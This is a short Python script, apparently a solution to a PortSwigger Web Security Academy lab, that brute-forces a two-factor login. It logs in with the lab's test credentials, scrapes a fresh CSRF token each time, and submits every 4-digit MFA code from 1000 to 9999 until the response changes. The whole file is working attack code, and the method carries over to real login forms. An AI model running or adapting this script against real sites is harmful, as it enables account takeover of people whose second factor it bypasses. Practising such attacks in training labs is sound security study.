#https://portswigger.net/academy/labs/launch/28468f8ce00fc3bd7c323d598659c718d294c4aa39e6a5e2b244b48b1116493e?referrer=%2fweb-security%2fauthentication%2fmulti-factor%2flab-2fa-bypass-using-a-brute-force-attack
import requests
import re
from bs4 import BeautifulSoup

url = f"https://0a0900db03ab6df7871d8d75004a00d7.web-security-academy.net"
login = url + "/login"
login2 = url + "/login2"
#login_creds = {"username":"carlos", "password":"montoya"} 

def csrf_fetch(response):
    soup = BeautifulSoup(response, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    #print(csrf_token)
    return csrf_token

def grab_session(set_cookie_string):
    match = re.search(r'session=([^;]+)', set_cookie_string)
    if match:
        session_value = match.group(1)
        return session_value
    else:
        print("Session cookie not found")

def re_login(client):
    response = client.get(login)
    login_payload = {
    "username":"carlos",
    "password":"montoya",
    "csrf":csrf_fetch(response.text)
    }
    r =client.post(url=login, data=login_payload)
    print(f"login stts code= {r.status_code}")

client = requests.sessions.Session()
while(True): 
    for i in range(1000,10000):
        re_login(client)
        #print(session_cookie)  
        login2_page = client.get(url=login2)
        mfa_payload={
            'csrf':csrf_fetch(login2_page.text),
            'mfa-code': i
        }
        mfa_response = client.post(url=login2, data=mfa_payload, allow_redirects=False)
        print(mfa_response.status_code)
        
        #if("4-digit security" in mfa_response.text): print("good")
        #elif ("Username" in mfa_response.text): print("bad")
        print(i)
        if(mfa_response.status_code == 200):
            continue
        else: exit(0)

